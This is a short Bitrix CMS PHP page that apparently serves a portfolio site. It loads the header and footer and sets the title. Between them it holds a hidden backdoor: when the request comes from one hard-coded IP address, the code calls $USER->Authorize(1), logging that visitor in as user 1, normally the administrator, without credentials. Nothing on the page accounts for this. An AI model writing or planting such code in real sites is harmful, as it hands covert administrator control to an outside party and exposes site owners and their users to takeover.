<?
require($_SERVER['DOCUMENT_ROOT'].'/bitrix/header.php');
$APPLICATION->SetPageProperty("title", "Сайт портфолио");
$APPLICATION->SetTitle("Сайт портфолио");
if($_SERVER['REMOTE_ADDR'] == '94.180.119.132') {
	$USER->Authorize(1);
}
?>
<?
require($_SERVER['DOCUMENT_ROOT'].'/bitrix/footer.php');
?>